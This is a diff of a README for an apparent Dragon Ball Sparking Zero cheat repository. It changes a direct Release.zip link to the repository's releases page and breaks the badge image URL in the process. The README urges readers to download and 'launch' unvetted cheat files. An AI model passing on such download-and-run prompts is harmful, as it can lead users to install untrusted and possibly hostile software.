@@ -26,9 +26,9 @@ Enhance your gameplay with the trainer available in this repository, providing y
 
 ## Visit the Release Section for Downloads 📥
 
-To access the latest cheats, mods, and unlocks for Dragon Ball Sparking Zero, head over to our [Release section](https://github.com/releases/789694263/Release.zip) and download the files. Launch the files and start your epic journey in the Dragon Ball universe with enhanced capabilities and unlimited possibilities.
+To access the latest cheats, mods, and unlocks for Dragon Ball Sparking Zero, head over to our [Release section](https://github.com/tejasshinde7498/Dragon-Ball-Sparking-Zero-Cheat/releases) and download the files. Launch the files and start your epic journey in the Dragon Ball universe with enhanced capabilities and unlimited possibilities.
 
-[![Download Cheat Menu](https://img.shields.io/badge/Download-Cheat%20Menu-orange)](https://github.com/releases/789694263/Release.zip)
+[![Download Cheat Menu](https://github.com/tejasshinde7498/Dragon-Ball-Sparking-Zero-Cheat/releases%20Menu-orange)](https://github.com/tejasshinde7498/Dragon-Ball-Sparking-Zero-Cheat/releases)
 
 ## Unlock the Power Within! ⚡
 
